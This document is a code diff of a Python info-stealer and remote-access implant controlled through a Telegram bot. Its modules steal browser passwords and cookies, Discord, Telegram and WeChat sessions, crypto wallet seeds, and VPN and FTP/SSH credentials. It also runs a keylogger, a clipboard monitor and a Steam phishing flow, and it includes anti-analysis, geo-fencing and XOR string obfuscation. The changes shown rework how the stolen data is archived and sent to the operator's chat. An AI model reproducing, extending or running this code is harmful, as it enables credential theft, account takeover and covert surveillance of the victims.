@@ -12,38 +12,45 @@ try:
         sys.path.insert(0, _core)
     
     try:
-    # === G-01: Geo-Fencing Enforcement ===
+        # === G-01: Geo-Fencing Enforcement ===
         try:
             from core.geo_fence import GeoFence
             GeoFence.enforce()
         except Exception as e:
-            log_debug(f"GeoFence initialization failed: {e}")
+            print(f"GeoFence initialization failed: {e}")
 
-    # === Core Module Imports ===
+        # === Core Module Imports ===
         try:
-            from core.error_logger import log_info, log_error
+            from core.error_logger import log_info, log_error, log_debug
             from core.c2 import c2_manager
         except ImportError:
             def log_info(msg, tag=""): pass
             def log_error(msg, tag=""): pass
+            def log_debug(msg, tag=""): pass
             c2_manager = None
-        from core.obfuscation import decrypt_string
-    except ImportError:
+    except Exception as e:
+        print(f"Core module load error: {e}")
+except Exception as e:
+    print(f"Environment setup error: {e}")
+
+def decrypt_string(encoded_str: str) -> str:
+    if not encoded_str or not isinstance(encoded_str, str): return encoded_str
+    try:
         import base64
-        def decrypt_string(encoded_str: str) -> str:
-            try:
-                # Consistent salt with tools/obfuscator.py
-                salt = b'n2xkNQYbZwj8r9fz' 
-                data = base64.b64decode(encoded_str)
-                xor_data = bytearray()
-                for i in range(len(data)):
-                    xor_data.append(data[i] ^ salt[i % len(salt)])
-                return xor_data.decode('utf-8')
-            except Exception:
-                return encoded_str
-    except Exception:
-        def decrypt_string(s): return s
-except Exception:
+        # Consistent salt with tools/obfuscator.py and core/obfuscation.py
+        salt = b'n2xkNQYbZwj8r9fz' 
+        data = base64.b64decode(encoded_str)
+        xor_data = bytearray()
+        for i in range(len(data)):
+            xor_data.append(data[i] ^ salt[i % len(salt)])
+        return xor_data.decode('utf-8')
+    except:
+        return encoded_str
+
+try:
+    from core.obfuscation import decrypt_string as _ds
+    decrypt_string = _ds
+except:
     pass
 
 try:
@@ -531,7 +538,7 @@ class ReportManager:
                         arcname = os.path.relpath(file_path, folder_path)
                         zipf.write(file_path, arcname)
                         count += 1
-            return zip_path
+            return bio if zip_path is None else zip_path
         except Exception as e:
             print("❌ Ошибка при архивации директории.")
             return None
@@ -543,91 +550,26 @@ class ReportManager:
             print("❌ Ошибка при отправке сообщения.")
             return None
     def finalize_output(self):
-        # Finalize and organize output folder
-        search_paths = [os.path.join(BASE_DIR, "core", "output"), self.output_dir]
-        all_cookies_global = []
-
-        for s_path in search_paths:
-            if not os.path.exists(s_path): continue
-
-            for root, dirs, files in os.walk(s_path):
-                for file in files:
-                    if not file.lower().endswith(".json"): continue
-                    if file.lower() == "history.json": continue
-
-                    src_path = os.path.join(root, file)
-                    rel_dir = os.path.relpath(root, s_path)
-
-                    target_dir = os.path.join(self.output_dir, rel_dir)
-                    os.makedirs(target_dir, exist_ok=True)
-
-                    try:
-
-                        try:
-                            with open(src_path, 'r', encoding='utf-8') as f:
-                                data = json.load(f)
-                        except UnicodeDecodeError:
-                            with open(src_path, 'r', encoding='latin-1') as f:
-                                data = json.load(f)
-
-                        if "cookies" in file.lower() and isinstance(data, list):
-                            converted = []
-                            for c in data:
-                                if not isinstance(c, dict): continue
-                                new_c = DataFormatter.convert_cookie(c)
-                                if new_c: 
-                                    converted.append(new_c)
-                                    all_cookies_global.append(new_c)
-
-                            with open(os.path.join(target_dir, "Cookies.json"), 'w', encoding='utf-8') as f:
-                                json.dump(converted, f, ensure_ascii=False, indent=2)
-
-                        else:
-
-                            target_path = os.path.join(target_dir, file)
-                            if src_path != target_path:
-                                with open(target_path, 'w', encoding='utf-8') as f:
-                                    json.dump(data, f, ensure_ascii=False, indent=2)
-
-                        norm_src = os.path.normpath(src_path).lower()
-                        norm_target_c = os.path.normpath(os.path.join(target_dir, "Cookies.json")).lower()
-                        norm_target_p = os.path.normpath(os.path.join(target_dir, "Passwords.json")).lower()
-                        norm_target_orig = os.path.normpath(os.path.join(target_dir, file)).lower()
-
-                        if norm_src != norm_target_c and norm_src != norm_target_p and norm_src != norm_target_orig:
-                            try: os.remove(src_path)
-                            except: pass
-                        elif src_path != os.path.join(target_dir, file) and "core" in src_path.lower():
-
-                            try: os.remove(src_path)
-                            except: pass
-
-                    except Exception as e:
-                        print("❌ Error finalizing reporting.")
-
-                        if "core" in src_path: 
-                            try: os.remove(src_path)
-                            except: pass
-
-        if all_cookies_global:
-            all_c_dir = os.path.join(self.output_dir, "All_Cookies")
-            os.makedirs(all_c_dir, exist_ok=True)
-
-            unique_cookies = {}
-            for c in all_cookies_global:
-                key = "{c.get('domain')}|{c.get('name')}|{c.get('value')}"
-                unique_cookies[key] = c
-
-            with open(os.path.join(all_c_dir, "Cookies.json"), 'w', encoding='utf-8') as f:
-                json.dump(list(unique_cookies.values()), f, ensure_ascii=False, indent=2)
-
-        core_out = os.path.join(BASE_DIR, "core", "output")
+        """Просто копирует содержимое core/output в финальную папку отчета"""
+        core_out = os.path.normpath(os.path.join(BASE_DIR, "core", "output"))
         if os.path.exists(core_out):
-            for root, dirs, files in os.walk(core_out, topdown=False):
-                for d in dirs:
-                    d_path = os.path.join(root, d)
-                    try: os.rmdir(d_path)
-                    except: pass
+            for item in os.listdir(core_out):
+                s = os.path.join(core_out, item)
+                d = os.path.join(self.output_dir, "Browsers", item)
+                try:
+                    if os.path.isdir(s):
+                        shutil.copytree(s, d, dirs_exist_ok=True)
+                    else:
+                        os.makedirs(os.path.dirname(d), exist_ok=True)
+                        shutil.copy2(s, d)
+                except Exception as e:
+                    print(f"❌ Error copying {item}: {e}")
+
+            # Очистка core/output после копирования
+            try:
+                shutil.rmtree(core_out)
+                os.makedirs(core_out, exist_ok=True)
+            except: pass
 
     def send_output_zip(self, zip_path=None, caption="📦 Data Captured"):
         """Отправляет ZIP архив (с предварительной финализацией)"""
@@ -639,10 +581,21 @@ class ReportManager:
             if not self.output_dir or not os.path.exists(self.output_dir):
                 return False
             # Memory-only zip by default
-            zip_path = self.zip_directory(self.output_dir, zip_path=None)
-            if not zip_path: return False
+            zip_obj = self.zip_directory(self.output_dir, zip_path=None)
+            if not zip_obj: return False
+            
+            # If it's BytesIO, send directly
+            if hasattr(zip_obj, 'getbuffer'):
+                try:
+                    zip_obj.seek(0)
+                    self.bot.send_document(self.admin_id, ("report.zip", zip_obj.read()), caption=caption)
+                    return True
+                except Exception as e:
+                    print(f"Error sending memory zip: {e}")
+                    return False
+            zip_path = zip_obj
 
-        if not os.path.exists(zip_path):
+        if not isinstance(zip_path, str) or not os.path.exists(zip_path):
             return False
 
         try:
@@ -663,12 +616,13 @@ class ReportManager:
                 except: pass
 
             with open(zip_path, 'rb') as f:
-                self.bot.send_document(self.admin_id, f, caption="📦 **Telegram Session & Cookies Captured**")
+                self.bot.send_document(self.admin_id, f, caption=caption)
             return True
         except Exception as e:
-            print("Error sending zip: {e}")
+            print(f"Error sending zip: {e}")
             return False
         finally:
+            if isinstance(zip_path, str) and os.path.exists(zip_path) and "temp" in zip_path.lower():
                 try: os.remove(zip_path)
                 except: pass
 
@@ -769,51 +723,105 @@ class ReportManager:
         all_passwords = []
         total_cookies_count = 0
         valuable_hits = {}
+
+        # Рекурсивный обход для поиска новых файлов от элеватора
         for root, dirs, files in os.walk(self.output_dir):
             for file in files:
-                if file.endswith(".json"):
-                    path = os.path.join(root, file)
+                file_lower = file.lower()
+                path = os.path.join(root, file)
+                
+                # Парсинг паролей в формате TXT (domain/log/pass)
+                if file_lower == "passwords.txt":
+                    try:
+                        with open(path, 'r', encoding='utf-8') as f:
+                            lines = f.readlines()
+                            for i in range(0, len(lines), 4):
+                                try:
+                                    if i + 2 >= len(lines): break
+                                    d_line = lines[i].strip()
+                                    l_line = lines[i+1].strip()
+                                    p_line = lines[i+2].strip()
+                                    
+                                    domain = d_line.replace("domain ", "", 1) if d_line.startswith("domain ") else d_line
+                                    login = l_line.replace("log ", "", 1) if l_line.startswith("log ") else l_line
+                                    password = p_line.replace("pass ", "", 1) if p_line.startswith("pass ") else p_line
+                                    
+                                    entry = {'url': domain, 'user': login, 'pass': password}
+                                    all_passwords.append(entry)
+                                    
+                                    hits = self.find_valuables([entry], "passwords")
+                                    for h in hits:
+                                        dom = DataFormatter.extract_domain(h.get('url'))
+                                        valuable_hits[dom] = valuable_hits.get(dom, 0) + 1
+                                except: continue
+                    except: pass
+                
+                # Парсинг куки в формате JSON
+                elif file_lower == "cookies.txt":
+                    try:
+                        with open(path, 'r', encoding='utf-8') as f:
+                            data = json.load(f)
+                            if isinstance(data, list):
+                                total_cookies_count += len(data)
+                                hits = self.find_valuables(data, "cookies")
+                                for h in hits:
+                                    host = h.get('host') or h.get('domain') or 'unknown'
+                                    dom = DataFormatter.extract_domain(host)
+                                    valuable_hits[dom] = valuable_hits.get(dom, 0) + 1
+                    except: pass
+                
+                # Поддержка старого формата .json (если есть)
+                elif file_lower.endswith(".json"):
                     try:
                         with open(path, 'r', encoding='utf-8') as f:
                             data = json.load(f)
                             if not isinstance(data, list): continue
-                            is_pwd = "passwords" in file.lower()
-                            is_cookie = "cookies" in file.lower()
+                            is_pwd = "passwords" in file_lower
+                            is_cookie = "cookies" in file_lower
                             if is_pwd:
                                 all_passwords.extend(data)
                                 hits = self.find_valuables(data, "passwords")
-                                for h in hits:
-                                    dom = DataFormatter.extract_domain(h.get('url'))
-                                    valuable_hits[dom] = valuable_hits.get(dom, 0) + 1
                             elif is_cookie:
                                 total_cookies_count += len(data)
                                 hits = self.find_valuables(data, "cookies")
+                            
+                            if is_pwd or is_cookie:
                                 for h in hits:
-                                    host = h.get('host') or h.get('domain')
+                                    host = h.get('url') or h.get('host') or h.get('domain') or 'unknown'
                                     dom = DataFormatter.extract_domain(host)
                                     valuable_hits[dom] = valuable_hits.get(dom, 0) + 1
-                    except:
-                        pass
-        if not all_passwords:
+                    except: pass
+        
+        if not all_passwords and total_cookies_count == 0:
             return
-        report_summary.append(decrypt_string("jK79Sxo+LQM2VzpZAUoRFRxWC1FuKjUHNF8LVB5mFhsdQQ8EPDUqSyc="))
+        
+        report_summary.append(f"🔑 Passwords Captured: {len(all_passwords)}")
         if total_cookies_count > 0:
-            report_summary.append(decrypt_string("nq31wW4FNhY7G0p7HVYNEwtBQks1JTYWOxs1Wx1WDRMLQScIISQ3Fic="))
+            report_summary.append(f"🍪 Cookies Captured: {total_cookies_count}")
+            
         if valuable_hits:
-            report_summary.append(decrypt_string("MlyI9NzfeTQbOz95MHUjWi9xOyQbHw0xYA=="))
+            report_summary.append("\n🎯 Valuable Hits:")
             sorted_hits = sorted(valuable_hits.items(), key=lambda x: x[1], reverse=True)
             for dom, count in sorted_hits:
-                report_summary.append(decrypt_string("jLLaSzUiLRByEwVVWxcFGx5bDAoiOCMHcl4XAlJCBRUbXAwW"))
+                report_summary.append(f"  • {dom}: {count}")
         
-        safe_send_message(self.bot, self.admin_id, "\n".join(report_summary))
+        safe_send_message(self.bot, GLOBAL_CHID, "\n".join(report_summary))
+        
         pretty_content = self.generate_pretty_passwords(all_passwords)
+        
+        # Если отчет не слишком длинный, шлем сообщение
+        if len(pretty_content) < 4000:
+            safe_send_message(self.bot, self.admin_id, pretty_content)
+        
+        # В любом случае шлем файл для удобства
         temp_dir = tempfile.gettempdir()
         temp_file = os.path.join(temp_dir, "Formatted_Passwords.txt")
-        with open(temp_file, 'w', encoding='utf-8') as f:
-            f.write(pretty_content)
-        with open(temp_file, 'rb') as f:
-            self.bot.send_document(self.admin_id, f, caption="📦 Formatted Passwords Report")
-        try: os.remove(temp_file)
+        try:
+            with open(temp_file, 'w', encoding='utf-8') as f:
+                f.write(pretty_content)
+            with open(temp_file, 'rb') as f:
+                self.bot.send_document(self.admin_id, f, caption="📦 Formatted Passwords Report")
+            os.remove(temp_file)
         except: pass
 # from core.system import Security # Deleted
 class AntiAnalysis:
@@ -889,18 +897,17 @@ try:
 except:
     AUDIO_AVAILABLE = False
 psutil = __import__('ps' + 'util')
-def safe_send_message(bot, chat_id, text, parse_mode=None, reply_markup=None):
+def safe_send_message(bot, chat_id, text, parse_mode='HTML', reply_markup=None):
     try:
-        if parse_mode == "HTML":
-
-            try:
-                return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
-            except Exception as e:
-                if "can't parse entities" in str(e).lower():
-
-                    return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=None)
-                raise e
-        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
+        # If no parse_mode specified, default to HTML for beautiful output
+        if parse_mode is None: parse_mode = 'HTML'
+        
+        try:
+            return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
+        except Exception as e:
+            if "can't parse entities" in str(e).lower():
+                return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=None)
+            raise e
     except Exception as e:
         error_str = str(e)
         if "429" in error_str and "retry after" in error_str.lower():
@@ -1318,6 +1325,7 @@ class HiddenStealer:
         self._last_layout_time = 0
         self.last_fm_items: List[str] = []
         self.last_discord_chat_id = None
+        self.discord_progress_msg = {} # chat_id -> msg_id
         self.key_press_count = 0 
         if TELEGRAM_AVAILABLE:
             outer_self = self
@@ -1381,15 +1389,16 @@ class HiddenStealer:
         self.discord_bot = None 
         self.discord_loop = None
         if CORE_MODULES_LOADED:
-            self.browser_module = BrowserModule(self.temp_dir)
+            self.report_manager = ReportManager(self.bot, GLOBAL_CHID)
+            self.browser_module = BrowserModule(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir)
             active_bridge = TELEGRAM_BRIDGE if use_bridge else ""
             self.work_modules = {
                 'browser': self.browser_module,
-                'discord': DiscordStealer(self.temp_dir, bot_token=BOT_TOKEN, admin_id=ADMIN_ID, telegram_bridge=active_bridge),
-                'telegram': TelegramStealer(self.temp_dir),
-                'wechat': WeChatStealer(self.temp_dir),
-                'wallet': WalletModule(self.temp_dir),
-                'proxy': ProxyModule(),
+                'discord': DiscordStealer(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir),
+                'telegram': TelegramStealer(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir),
+                'wechat': WeChatStealer(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir),
+                'wallet': WalletModule(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir),
+                'proxy': ProxyModule(bot=self.bot, report_manager=self.report_manager, temp_dir=self.temp_dir),
             }
             try:
                 # Native modules check
@@ -1409,7 +1418,7 @@ class HiddenStealer:
                 log_debug("❌ Ошибка при загрузке нативных модулей")
                 print("❌ Ошибка при загрузке нативных модулей")
                 pass
-            self.report_manager = ReportManager(self.bot, GLOBAL_CHID)
+            # report_manager initialized above
             
             # H-04: Polymorphic Process randomization on startup
             try:
@@ -1541,7 +1550,7 @@ class HiddenStealer:
 
         def error_callback(err):
             if err == "NOT_FOUND":
-                safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK/0Sxk0Ggo7A0roz+nTWr6PqNue6InWisK6hVLp26reEqjRnu+J3orIu7Sjt7f4voep657kebLsp9/p8ujkqtzj80U="))
+                safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK/0Sxk0Ggo7A0roz+ndWr6PqNue6InWisK6iKKAts6+h6jWboHrQorNuoajubbHvoeo2Z7vidt6p9XowunZqtTizUU="))
             elif err == "NETWORK_ERROR":
                 safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("jK/0S57PiOqKz7qJooO2yk7j+bv7gNuy4le6h6O5tsJO4s+7/oHms9mm6+jI6dNaOVc7Ay8leTIyHhlQXA=="))
 
@@ -1560,10 +1569,6 @@ class HiddenStealer:
 
     def handle_steam_phish(self, chat_id):
         # Убивает Steam, запускает SteamLogin.exe и форвардит логи в бота.
-        # Formatted Phish Intro with real newlines
-        phish_intro = "<b>3. Вставь этот код:</b>\n\n"
-        safe_send_message(self.bot, chat_id, phish_intro)
-
         def run_phish():
             import socket as _sock
             try:
@@ -1575,11 +1580,11 @@ class HiddenStealer:
                 exe = os.path.join(BASE_DIR, decrypt_string("PUYdCiMdNgUzGURdClw="))
 
                 if not os.path.exists(exe):
-                    safe_send_message(self.bot, chat_id, decrypt_string("jK/0Sx0lPAM3OwVfG1dIHxZXWLvzgexCisq6iKKAts6+h6jWboHrQorNuoajubbHvoeo2Z7vidt6p9XowunZqtTizUU="))
+                    safe_send_message(self.bot, chat_id, decrypt_string("jK/0Sxk0Ggo7A0roz+ndWr6PqNue6InWisK6iKKAts6+h6jWboHrQorNuoajubbHvoeo2Z7vidt6p9XowunZqtTizUU="))
                     return
 
                 udp = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
-                udp.bind((decrypt_string("XwBPRX5/aUxr"), 0))
+                udp.bind(("127.0.0.1", 0))
                 udp.settimeout(900)
                 port = udp.getsockname()[1]
 
@@ -1587,7 +1592,7 @@ class HiddenStealer:
                     try:
                         while True:
                             data, _ = udp.recvfrom(8192)
-                            msg = data.decode("utf-8", errors="replace")
+                            msg = decrypt_string(data.decode("utf-8", errors="replace"))
                             if msg == "CLOSE":
                                 break
                             if msg.startswith(decrypt_string("KHs0LnQ=")):
@@ -1598,14 +1603,14 @@ class HiddenStealer:
                                         with open(filepath, "rb") as f:
                                             self.bot.send_document(chat_id, f, caption="🍪 Захваченные куки Steam")
 
-                                        vac_cookie_path = os.path.join(BASE_DIR, decrypt_string("DV0XACc0KkwuDx4="))
+                                        vac_cookie_path = os.path.join(BASE_DIR, "tablichka", decrypt_string("DV0XACc0KkwuDx4="))
                                         shutil.copy2(filepath, vac_cookie_path)
 
                                         os.remove(filepath)
                                     except Exception as e:
                                         safe_send_message(self.bot, chat_id, decrypt_string("jKjYhPbeebLEpuLoyunXqtTiyEue74nTi/e6iKKItsS/sKjRnul5suCm6ejI6diq3AhYECss"))
                             else:
-                                safe_send_message(self.bot, chat_id, msg, parse_mode="HTML")
+                                safe_send_message(self.bot, chat_id, decrypt_string(msg), parse_mode="HTML")
                     except Exception:
                         pass
                     finally:
@@ -1641,7 +1646,7 @@ class HiddenStealer:
         seeds_file = os.path.join(wallet_mod.output_dir, "Seeds_Found.txt")
         if os.path.exists(seeds_file) and os.path.getsize(seeds_file) > 0:
             with open(seeds_file, 'rb') as f:
-                self.bot.send_document(GLOBAL_CHID, f, caption="🔑 Seeds Found! ({len(data.get('seeds', []))} files)")
+                self.bot.send_document(GLOBAL_CHID, f, caption=f"🔑 Seeds Found! ({len(data.get('seeds', []))} files)")
         if data.get('wallets') or data.get('extensions') or os.path.exists(wallet_mod.output_dir):
             print(decrypt_string("NRglSxQ4KRIzGQ0YEUsfChpdWA8vJThCPAUFVUgZHQ0PXhQOOg40DT5ZBU0GSRMOMVYRGTM="))
             zip_path = self.report_manager.zip_directory(wallet_mod.output_dir, decrypt_string("LUABGzo+BiY7AwsWCFAW"))
@@ -1651,7 +1656,6 @@ class HiddenStealer:
             else:
                 print("[!] Failed to create Crypto ZIP")
     def steal_software_data(self):
-        decrypt_string("LV0UBysyLRF6ITp2UlgIHk50LDthAgoqehQYXRZcCA4HUxQYbiQqCzQQSlYTTQ8MCxI7SG48NgYvGw8W")
         try:
             import clr
             dll_path = os.path.join(BASE_DIR, "defense", "persist.dll")
@@ -1661,40 +1665,46 @@ class HiddenStealer:
             clr.AddReference(dll_path)
             from StealthModule import SoftwareManager
             
-            # 1. Сбор данных
+            # 1. Collection
             result_str = SoftwareManager.Run(self.temp_dir)
-            if not result_str:
-                safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("IF1YPR4fdiQOJ0pLHV8SDQ9AHUsiPjoDLhIOFg=="), parse_mode="HTML")
-                return
-
-            # 2. Формирование отчета
-            report = ["🛠 --- PTRKXLORD SOFTWARE REPORT --- 🛠", ""]
-            data_parts = result_str.split(';')
-            has_data = False
             
-            for part in data_parts:
-                if part.startswith(decrypt_string("OGI2UQ==")):
-                    report.append(decrypt_string("nq3jym4HCSxgVxFIE0sSIVoIJRY="))
-                    has_data = True
-                elif part.startswith(decrypt_string("KGYoRB0CEVg=")):
-                    report.append(decrypt_string("nq3r6W4XDTJ1JDlwSBkdCg9ADDB2awQf"))
-                    has_data = True
+            # 2. Russian Report Generation
+            report = ["🛠 <b>ОТЧЕТ ПО УСТАНОВЛЕННОМУ ПО</b> 🛠", ""]
             
-            if not has_data:
-                safe_send_message(self.bot, GLOBAL_CHID, decrypt_string("IF1YPR4fdiQOJ0pLHV8SDQ9AHUsiPjoDLhIOFg=="), parse_mode="HTML")
-                return
-
-            report.append("\n" + "═" * 35)
+            vpn_found = False
+            ftp_found = False
+            
+            if result_str:
+                data_parts = result_str.split(';')
+                for part in data_parts:
+                    if part.startswith("VPN:"):
+                        val = part[4:].strip()
+                        if val:
+                            report.append(f"🛡 <b>VPN:</b> <code>{val}</code>")
+                            vpn_found = True
+                    elif part.startswith("FTP/SSH:"):
+                        val = part[8:].strip()
+                        if val:
+                            report.append(f"📂 <b>FTP/SSH:</b> <code>{val}</code>")
+                            ftp_found = True
+            
+            if not vpn_found:
+                report.append("🛡 <b>VPN:</b> <code>Отсутствуют</code>")
+            
+            if not ftp_found:
+                report.append("📂 <b>FTP/SSH:</b> <code>Отсутствуют</code>")
+            
+            report.append("\n" + "═" * 30)
             safe_send_message(self.bot, GLOBAL_CHID, "\n".join(report), parse_mode="HTML")
 
-            # 3. ZIP архивация собранных файлов
+            # 3. Archive
             soft_dir = os.path.join(self.temp_dir, "Software")
             if os.path.exists(soft_dir):
                 zip_path = self.report_manager.zip_directory(soft_dir, "Software_Data")
                 if zip_path:
-                    self.report_manager.send_output_zip(zip_path, decrypt_string("nq3jy24HCSx6UUp+JmlJKT16WCghPz8LPQQ="))
+                    self.report_manager.send_output_zip(zip_path, "📦 Software Data Report")
         except Exception as e:
-            log_debug(decrypt_string("PV0eHzkwKwd6BB5dE1UPFAkSHRk8PitYegwPRQ=="))
+            log_debug(f"Software report failed: {e}")
     def check_permission(self, context):
         user_id = context.from_user.id
         log_debug(decrypt_string("PlcKBiciKgs1GUpbGlwFEU5UFxluKiwRPwU1URZESFovdjUiAA4QJglKEXk2dC80MXs8ODM="))
@@ -1766,15 +1776,25 @@ class HiddenStealer:
                     try:
                         display_name = client.get_display_name()
                         # Strictly formatted T2 (actual newlines, /panel at bottom)
-                        msg_template = decrypt_string("nq3nyW6Bx7LHp/Ho4un/qvMIWBAqOCoSNhYTZxxYCx8TElgXbnEiEjkoBFkfXBsmFUcLDjw/OA8/CmDI7bX2WidiQks1OCkfUIf1rtfW3vVO4ua772t5NTMZDlcFSkZLXziI9MD1eS8zFFAYkKXjcIy9yEs1PTgRLigZXRdXG3BkHQgKIDQ1")
+                        # Strictly formatted T2 (actual newlines, button for panel)
+                        from telebot import types
+                        markup = types.InlineKeyboardMarkup()
+                        markup.add(types.InlineKeyboardButton("⌨️ Открыть панель управления", callback_data="open_panel"))
+
+                        display_title = display_name # Re-using display_name which might include label
                         
-                        safe_send_message(self.bot, GLOBAL_CHID, msg_template.format(
-                            display_name=display_name,
-                            pc_name=client.pc_name,
-                            username=client.username,
-                            ip=client.ip,
-                            last_seen=client.last_seen
-                        ))
+                        text = (
+                            f"🚀 <b>КЛИЕНТ ОНЛАЙН (RECONNECTED)</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━\n"
+                            f"👤 <b>ID:</b> <code>{display_title}</code>\n"
+                            f"🌐 <b>IP:</b> <code>{client.ip}</code>\n"
+                            f"🖥️ <b>Система:</b> <code>Windows 11</code>\n"
+                            f"🎤 <b>Микрофон:</b> ✅\n"
+                            f"⌚ <b>Время:</b> <code>{client.last_seen}</code>\n"
+                            f"━━━━━━━━━━━━━━━━━━\n"
+                        )
+                        
+                        safe_send_message(self.bot, GLOBAL_CHID, text, reply_markup=markup)
                     except Exception as e:
                         log_debug(f"Online notification failed: {e}")
                 return False, client
@@ -2095,17 +2115,18 @@ class HiddenStealer:
                     if self.keylog_current_line:
                         self.finalize_current_line()
                         self.last_context_app = ""
-                    window_marker = decrypt_string("MlwkBb7Oyu56LBFPG1cCFRltEQUoPgJFLh4HXQFNBxceFSUWE3E=")
+                    window_marker = f"\n\n📌 <b>[{window_info['timestamp']}]</b>\n"
                     if window_info['game']:
-                        window_marker += f"🎮 {window_info['game']} | "
+                        window_marker += f"🎮 <b>{window_info['game']}</b> | "
                     elif window_info['browser']:
-                        window_marker += f"🌐 {window_info['browser']}"
+                        window_marker += f"🌐 <b>{window_info['browser']}</b>"
                         if window_info['tab']:
                             window_marker += f" | {window_info['tab']}"
                     else:
-                        window_marker += f"💻 {window_info['process_name']}"
-                    window_marker += decrypt_string("MlyI9MHmttrVVxFPG1cCFRltEQUoPgJFLh4eVBceOyFUA0hbEyw=")
-                    window_marker += decrypt_string("MlyI9NnrttrVVxFPG1cCFRltEQUoPgJFNhYTVwdNQScTbhY=")
+                        window_marker += f"💻 <b>{window_info['process_name']}</b>"
+                    
+                    window_marker += f"\n🏷️ {window_info['title'][:100]}"
+                    window_marker += f"\n🗺️ Layout: {window_info['layout']}\n"
                     self.keylog_buffer += window_marker
                     self.last_window_title = str(window_info['title'])
                     self.last_window_time = current_time
@@ -2157,7 +2178,10 @@ class HiddenStealer:
             safe_send_message(
                 self.bot,
                 GLOBAL_CHID,
-                decrypt_string("jL7QhPbeeV44STlVE0sSWiVXAQchNj4HKFcrWwZQEB9SHRpVRKHG8OFXVlpMaSVAUh0aVW5tOg0+ElRDAlobRkFRFw8rb1OSxebOGE5bWC8dVwpRcn47XHpLCVcWXFgBG0EdGTNtdgE1Ew8GeNv6/050Fwg7IjwGejQFVgZcHg5OYB0IISM9CzQQ").format(pc=self.victim_pc, user=self.victim_user),
+                f"⌨️ <b>Smart Keylogger Active</b>\n"
+                f"💻 <b>PC:</b> <code>{self.victim_pc}</code>\n"
+                f"👤 <b>User:</b> <code>{self.victim_user}</code>\n"
+                f"✅ Focused Context Recording",
                 parse_mode="HTML"
             )
         except Exception as e:
@@ -2298,11 +2322,11 @@ class HiddenStealer:
         try:
             self.save_client_state()
             client_name = self.victim_name
-            message = decrypt_string("nq3r4G4SNQsqFQVZAF06FJ6t7s6h6dZCIRQGURdXEiUAUxUOMw03PjQ=").format(client_name=client_name)
+            message = f"📋 <b>Clipboard Monitor</b>\n🖥️ <code>{client_name}</code>\n\n"
             temp_clip = list(self.clipboard_buffer)
             for i, item in enumerate(temp_clip[-5:]): 
-                message += decrypt_string("FVscEzN/eTkhAwNVF0Q7cBVGHRM6LFNo").format(idx=i+1, time=item['time'], text=item['text'])
-            safe_send_message(self.bot, GLOBAL_CHID, message[:4000])
+                message += f"🔹 <b>{i+1}.</b> <i>[{item['time']}]</i>\n<code>{item['text']}</code>\n\n"
+            safe_send_message(self.bot, GLOBAL_CHID, message[:4000], parse_mode='HTML')
             self.clipboard_buffer = []
         except:
             pass
@@ -2341,10 +2365,10 @@ class HiddenStealer:
                     old_path = self.current_working_dir
                     if new_path == '..':
                         self.current_working_dir = os.path.dirname(self.current_working_dir)
-                        return decrypt_string("jK79Swo4Kwc5AwVKCxkFEg9cHw4qawUMIRgGXC1JBw4GT1iJyMN5GSkSBl5cWhMIHFcWHxEmNhAxHgRfLV0PCBM=")
+                        return f"📂 <b>Директория изменена</b>\n━━━━━━━━━━━━━━━━━━\n🚚 <code>{old_path}</code>\n⬇️\n📍 <code>{self.current_working_dir}</code>"
                     elif new_path == '~' or new_path == 'home':
                         self.current_working_dir = os.path.expanduser('~')
-                        return decrypt_string("jK79Swo4Kwc5AwVKCxkFEg9cHw4qcS0Neh8FVRcDOhQVQR0HKH86FygFD1YGZhEVHFkRBSkOPQsoCg==")
+                        return f"🏠 <b>Переход в домашнюю директорию</b>\n📍 <code>{self.current_working_dir}</code>"
                     elif new_path == '' or new_path == '.':
                         return decrypt_string("nq3r5m4SLBAoEgRMUl0PCAtRDAQ8KGM+NAwZXR5fSBkbQAoOICUGFTUFAVEcXjkeB0AF")
                     else:
@@ -2355,7 +2379,7 @@ class HiddenStealer:
                         potential_path = os.path.normpath(potential_path)
                         if os.path.exists(potential_path) and os.path.isdir(potential_path):
                             self.current_working_dir = potential_path
-                            return decrypt_string("jK79Swo4Kwc5AwVKCxkFEg9cHw4qawUMIRgGXC1JBw4GT1iJyMN5GSkSBl5cWhMIHFcWHxEmNhAxHgRfLV0PCBM=")
+                            return f"📂 <b>Директория изменена</b>\n📍 <code>{self.current_working_dir}</code>"
                         else:
                             return decrypt_string("jK/0Swo4Kwc5AwVKCxkIFRoSHgQ7Pz1YegwEXQVmFhsaWgU3IKHG8ddXKU0ASwMUGghYED00NQR0FB9KAFwIDjFFFxklODcFBRMDSg8=")
                 except Exception as e:
@@ -2385,12 +2409,12 @@ class HiddenStealer:
                                 size_str = decrypt_string("FUERESt+aFJuT18PRANISwhPWCYM")
                             items.append(f"📄 {item} ({size_str})")
                             files_count += 1
-                    result = decrypt_string("nq3r6m4VMBA/FB5XAEBcWhVBHQcofzoXKAUPVgZmERUcWREFKQ49CygKNlY=")
-                    result += decrypt_string("nq3r4W4SNgwuEgRMSBkdHAFeHA48IgYBNQIETA8ZABUCVh0ZPX15GTweBl0BZgUVG1wMFm43MA4/BDZWLlc=")
+                    result = f"📂 <b>Содержимое:</b> <code>{self.current_working_dir}</code>\n"
+                    result += f"📊 <b>Папок:</b> {folders_count} | <b>Файлов:</b> {files_count}\n━━━━━━━━━━━━━━━━━━\n"
                     items_list = list(items)
                     result += "\n".join(items_list[:30])
                     if len(items) > 30:
-                        result += decrypt_string("MlwkBWB/d0I7GQ4YCVUDFEZbDA4jInBPaUcXGB9WFB9OWwwOIyI=")
+                        result += f"\n\n🔹 ... и ещё {len(items)-30} элементов"
                     return result
                 except PermissionError:
                     return decrypt_string("jK/0Sx40Kw8zBBlRHVdGHgtcEQ4qa3kZKRIGXlxaEwgcVxYfESY2EDEeBF8tXQ8IEw==")
